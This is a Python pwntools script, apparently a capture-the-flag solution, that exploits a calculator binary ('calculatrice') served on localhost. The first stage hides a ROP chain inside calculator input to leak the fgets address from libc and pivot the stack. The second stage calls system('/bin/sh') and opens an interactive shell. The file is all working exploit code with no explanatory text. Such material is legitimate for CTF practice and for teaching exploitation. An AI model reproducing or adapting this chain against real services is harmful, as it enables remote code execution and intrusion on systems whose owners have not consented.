from pwn import *

b = ELF("calculatrice")
rop = ROP(b)
#libc = b.libc
libc = ELF('libs/libc.so.6')
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
pop_rsp_r13 = rop.find_gadget(["pop rsp", "pop r13", "ret"]).address
pop_rbp = rop.find_gadget(["pop rbp", "ret"]).address

data = 0x404170
new_rbp = 0x4042B0
newstack = 0x404DB0

p = remote('localhost',1337)
#p = b.process()
stage1 = (
    b"1*7*1*9*9*9*9*1*1*2*3*5*6"
    + b"*%d" % pop_rdi
    + b"*%d" % b.got["fgets"]
    + b"*%d" % b.sym["puts"]
    + b"*%d" % pop_rsi_r15
    + b"*%d" % newstack
    + b"*0"
    + b"*%d" % pop_rdi
    + b"*%d" % b.sym["stdin"]
    + b"*%d" % b.sym["strsep"]
    + b"*%d" % pop_rdi
    + b"*%d" % newstack
    + b"*%d" % pop_rsi_r15
    + b"*256"
    + b"*P"
    + b"*%d" % b.sym["fgets"]
    + b"*%d" % pop_rsp_r13
    + b"*%d" % newstack
)

log.info(f"\nStage 1 : {stage1}\n")
log.info("Stage 1 length : %d" % len(stage1))
p.recvuntil(b": ")
p.sendline(stage1)
log.info("Sent stage 1 :)")
leak_fgets = u64(p.recvuntil(b"\x7f").ljust(8, b"\0"))
p.recv()
libc.address = leak_fgets - libc.sym["fgets"]
print("libc @ 0x%x" % libc.address)

stage2 = (
    p64(0x1337)
    + p64(pop_rsi_r15)
    + p64(0) * 2
    + p64(pop_rdi)
    + p64(next(libc.search(b"/bin/sh\x00")))
    + p64(libc.sym['system'])
    + p64(pop_rdi)
    + p64(0)
    + p64(libc.sym['exit'])
)
if b"\n" in stage2:
    log.error("BADCHAR \\n in stage 2")

p.sendline(stage2)
p.interactive()
